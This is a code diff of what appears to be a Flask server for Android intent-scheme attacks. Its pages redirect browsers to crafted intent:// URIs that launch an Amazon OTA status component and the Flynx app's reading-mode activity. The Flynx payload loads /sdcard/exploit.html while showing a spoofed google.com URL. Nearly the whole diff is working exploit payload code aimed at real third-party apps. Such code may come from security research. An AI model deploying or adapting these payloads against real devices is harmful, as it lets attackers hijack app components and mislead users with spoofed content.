@@ -18,7 +18,33 @@ def intent_service():
             </head>
             <body>
                 <script>
-                    location.href="intent://#Intent;SEL;action=android.intent.action.VIEW;end";
+                    location.href="intent://#Intent;SEL;component=com.amazon.dcp/.framework.DashboardActivity;action=com.amazon.dcp.ota.START_STATUS_TOOL;category=android.intent.category.DEFAULT;end";
+                </script>
+            </body>
+        </html>
+
+    """
+
+    return response
+
+
+@src.route('/services/flynx')
+def flynx():
+
+    """
+    Triggers the parsing of the intent:// URI scheme
+    """
+
+    response = """
+
+        <html>
+            <head>
+                <meta charset="utf-8" />
+                <title>Trigger parseUri()</title>
+            </head>
+            <body>
+                <script>
+                    location.href="intent://#Intent;S.webArchivePath=/sdcard/exploit.html;S.originalUrl=http://www.google.com;SEL;component=com.flynx/.ReadingModeActivity;end";
                 </script>
             </body>
         </html>
